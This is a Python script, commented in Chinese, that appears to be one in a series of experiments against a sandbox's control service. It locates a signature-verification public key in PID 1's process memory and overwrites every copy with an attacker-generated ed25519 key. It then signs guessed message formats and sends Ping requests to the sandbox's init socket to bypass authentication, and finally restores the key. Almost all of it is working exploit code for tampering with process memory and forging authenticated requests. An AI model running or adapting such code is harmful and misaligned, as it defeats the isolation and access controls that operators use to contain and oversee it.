# 实验J4: pubkey 内存替换 + 自持私钥签名 Ping 试错(消息格式黑盒)
# J3 证实: 3 个 pubkey 副本全在 rw 段可写; 中间件要求 signature(base64) + timestamp 头
# 目标: 替换验证公钥 -> 用攻击者私钥签名候选消息格式 -> Ping 返回非401 = 破解!
# 安全: 单 cmd 内 替换->测试->恢复, 不破坏 agent 通信
import os, re, subprocess, base64, time, socket

def run(cmd, timeout=20):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

# ---------- [1] 提取 pubkey + 定位副本 ----------
cmdline = run("cat /proc/1/cmdline | tr '\\0' ' '")
m = re.search(r"--pubkey=([A-Za-z0-9+/=]+)", cmdline)
orig_pub = base64.b64decode(m.group(1)) if m else b""
print(f"[1] orig pubkey: {m.group(1) if m else '?'}", flush=True)

maps_txt = open("/proc/1/maps").read()
copies = []
for line in maps_txt.splitlines():
    parts = line.split()
    if len(parts) < 2 or parts[1][0] != "r":
        continue
    try:
        a0, a1 = parts[0].split("-")
        start, end = int(a0, 16), int(a1, 16)
    except Exception:
        continue
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, min(end - start, 16 * 1024 * 1024), start)
        os.close(fd)
    except Exception:
        continue
    idx = 0
    while True:
        i = d.find(orig_pub, idx)
        if i < 0:
            break
        copies.append(start + i)
        idx = i + 1
print(f"    pubkey 副本 {len(copies)} 处: {[hex(c) for c in copies]}", flush=True)

# ---------- [2] 生成攻击者 ed25519 keypair ----------
print("[2] 生成攻击者 keypair", flush=True)
run("openssl genpkey -algorithm ED25519 -out /tmp/atk_priv.pem 2>&1")
run("openssl pkey -in /tmp/atk_priv.pem -pubout -outform DER -out /tmp/atk_pub.der 2>&1")
atk_pub_der = open("/tmp/atk_pub.der", "rb").read()
atk_pub = atk_pub_der[-32:]
print(f"    atk pub (last32): {base64.b64encode(atk_pub).decode()}", flush=True)

def sign(msg: bytes) -> bytes:
    open("/tmp/msg.bin", "wb").write(msg)
    run("openssl pkeyutl -sign -inkey /tmp/atk_priv.pem -rawin -in /tmp/msg.bin -out /tmp/sig.bin 2>&1")
    return open("/tmp/sig.bin", "rb").read()

# ---------- [3] 替换 pubkey (备份) ----------
print("[3] 替换 pubkey -> 攻击者公钥", flush=True)
fd = os.open("/proc/1/mem", os.O_RDWR)
backups = []
for off in copies:
    orig = os.pread(fd, 32, off)
    backups.append((off, orig))
    os.pwrite(fd, atk_pub, off)
print(f"    已写入 {len(copies)} 处", flush=True)

# ---------- [4] 签名消息格式试错 (Ping) ----------
print("[4] Ping 签名试错", flush=True)
def http_unix(path, body=b"{}", headers=None, timeout=5):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect("/run/vercel/share/init.sock")
        hdrs = "".join(f"{k}: {v}\r\n" for k, v in (headers or {}).items())
        req = (f"POST {path} HTTP/1.1\r\nHost: localhost\r\n"
               f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n"
               f"{hdrs}\r\n").encode() + body
        s.sendall(req)
        data = b""
        try:
            while len(data) < 2048:
                c = s.recv(4096)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        s.close()
        status = data.split(b" ", 2)[1] if b" " in data else b"?"
        return status.decode(), data[:180]
    except Exception as e:
        return "ERR", str(e).encode()

P = "/vercel.sandbox.spawn.v1.SpawnService/Ping"
ts = str(int(time.time()))
body = b"{}"
candidates = {
    "ts": ts.encode(),
    "ts+body": ts.encode() + body,
    "ts:body": ts.encode() + b":" + body,
    "body": body,
    "ts+path": ts.encode() + b"Ping",
    "raw-ts-nums": str(int(time.time() * 1000)).encode(),  # 毫秒
}
success = None
for label, msg in candidates.items():
    sig = sign(msg)
    status, resp = http_unix(P, headers={
        "signature": base64.b64encode(sig).decode(),
        "timestamp": ts,
    })
    print(f"  {label:<12} -> {status} {resp[:120]!r}", flush=True)
    if status == "200":
        success = label
        print(f"  >>>>>> 破解成功! 消息格式 = {label} <<<<<<", flush=True)
        break
    if "invalid signature" in resp.decode(errors='replace'):
        print(f"    (签名验证失败: invalid signature)", flush=True)

# ---------- [5] 恢复 pubkey ----------
print("[5] 恢复原 pubkey", flush=True)
for off, orig in backups:
    os.pwrite(fd, orig, off)
os.close(fd)
print("    恢复完成", flush=True)

# ---------- [6] 复核 agent 通信未破坏 ----------
print("[6] 复核: 无签名请求仍 401 (中间件正常)", flush=True)
status, resp = http_unix(P)
print(f"  无签名 Ping -> {status} {resp[:80]!r}", flush=True)
print("done", flush=True)
